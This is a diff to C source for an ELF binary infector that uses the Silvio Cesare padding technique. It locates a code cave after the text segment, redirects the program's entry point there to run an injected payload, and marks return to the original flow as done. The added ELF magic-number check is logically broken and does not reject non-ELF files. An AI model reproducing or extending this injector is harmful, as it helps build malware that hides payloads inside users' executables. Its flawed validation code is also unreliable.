@@ -6,6 +6,7 @@
 #include <fcntl.h>
 #include <unistd.h>
 #include <stdio.h>
+#include <zlib.h>
 #define JMP_BACK 5
 #define INTRO 40
 #define PAGE_SIZE sysconf(_SC_PAGESIZE)
@@ -15,7 +16,7 @@
 	- error checks
 	- b64 input support
 	- refactor code (clean up, structure for elf, header files etc.)
-	- wrap payload into return-to-original-flow
+	- wrap payload into return-to-original-flow DONE
 	- shrink wrapper using smaller instructions
 	- modify creation date
 
@@ -46,6 +47,7 @@ char	*open_file(char *av, ssize_t *size) {
 	struct stat fdata;
 	int fd;
 	char *file;
+	ElfW(Ehdr) *e_hdr;
 
 	if ((fd = open(av, O_RDONLY)) == -1)
 	{
@@ -65,6 +67,15 @@ char	*open_file(char *av, ssize_t *size) {
 		perror("mmap: ");
 		return (NULL);
 	}
+
+	e_hdr = (ElfW(Ehdr) *)file;
+	if (e_hdr->e_ident[0] != 0x7f && strcmp(&e_hdr->e_ident[1], "ELF"))
+    {
+            printf("%s is not an elf file\n", av);
+            munmap(file, *size);
+			exit(-1);
+    }
+
 	close(fd);
 	return (file);
 }
@@ -111,6 +122,7 @@ void	silvio_inject(char *fname, ssize_t payload_len, char *payload){
 			cave_off = phdr[i].p_vaddr + og_filesz;
 			og_entry = ehdr->e_entry;
 			ssize_t cave_size = abs((phdr[i].p_vaddr + phdr[i].p_align) - cave_off); 
+			printf("Reverse text size: %d\n", phdr[i].p_vaddr - (0x1000 + sizeof(ElfW(Ehdr))));
 			ehdr->e_entry = cave_off;
 			if (cave_size < payload_len ){
 				//make clean_exit()
